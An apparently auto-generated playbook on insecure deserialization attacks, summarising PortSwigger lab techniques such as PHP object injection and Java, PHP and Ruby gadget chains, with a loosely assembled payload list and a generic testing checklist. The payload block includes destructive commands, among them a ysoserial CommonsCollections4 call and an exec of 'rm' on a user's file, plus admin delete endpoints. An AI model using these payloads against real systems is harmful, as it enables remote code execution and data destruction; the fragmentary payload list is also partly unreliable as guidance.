## DESERIALIZATION Playbook
*Synthesized from 10 PortSwigger labs*

### Overview
This playbook covers 10 known attack techniques for deserialization.

### Attack Techniques

**General:**
- Arbitrary object injection in PHP
- Developing a custom gadget chain for Java deserialization
- Developing a custom gadget chain for PHP deserialization
- Exploiting Java deserialization with Apache Commons
- Exploiting PHP deserialization with a pre-built gadget chain
- Exploiting Ruby deserialization using a documented gadget chain
- Modifying serialized data types
- Modifying serialized objects

### Key Payloads
```
morale.txt
CustomTemplate
__wakeup()
default_desc_type
/home/[TARGET_USER]/morale.txt
Product
/my-account/delete
POST /my-account/delete
file_exists()
GET /cgi-bin/avatar.php?avatar=[TEST_USER]
__get()
/backup/AccessTokenUser.java
exec(rm /home/[TARGET_USER]/morale.txt)
$name
/cgi-bin/phpinfo.php
desc
/admin
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/[TARGET_USER]/morale.txt' | base64
Universal Deserialisation Gadget for Ruby 2.x-3.x
/admin/delete?username=[TARGET_USER]
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

